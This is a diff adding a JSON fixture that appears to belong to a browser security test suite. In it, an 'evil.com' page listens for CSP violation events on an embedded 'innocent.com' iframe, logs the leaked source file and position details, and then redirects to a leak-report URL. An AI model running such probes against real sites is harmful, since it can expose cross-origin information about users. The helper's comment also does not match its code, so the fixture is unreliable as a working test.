@@ -1,0 +1,18 @@
+```json
+{
+  "c633348": {
+    "url_queue.txt": "https://evil.com/CSP/c633348/main\nhttps://a.test/report/?leak=baseline\n",
+    "evil.com": {
+      "main": {
+        "index.html": "<!DOCTYPE html>\n<html>\n<body>\n  <iframe src=\"https://innocent.com/CSP/c633348/helper\" id=\"iframe\"></iframe>\n  <script>\n    document.addEventListener(\"securitypolicyviolation\", function(e) {\n      console.log(\"securitypolicyviolation_event.sourceFile=\" + e.sourceFile);\n      console.log(\"securitypolicyviolation_event.lineNumber=\" + e.lineNumber);\n      console.log(\"securitypolicyviolation_event.columnNumber=\" + e.columnNumber);\n      document.location.href = 'https://a.test/report/?leak=c633348';\n    });\n  </script>\n</body>\n</html>",
+        "headers.json": "[\n  {\n    \"key\": \"Content-Security-Policy-Report-Only\",\n    \"value\": \"frame-src 'self'\"\n  }\n]"
+      }
+    },
+    "innocent.com": {
+      "helper": {
+        "index.html": "<html>\n<body>\n  <script>\n    // This script will navigate the iframe triggering a CSP violation\n    document.write('<a href=\"https://untrusted.com\" target=\"_blank\">Click me</a>');\n  </script>\n</body>\n</html>"
+      }
+    }
+  }
+}
+```
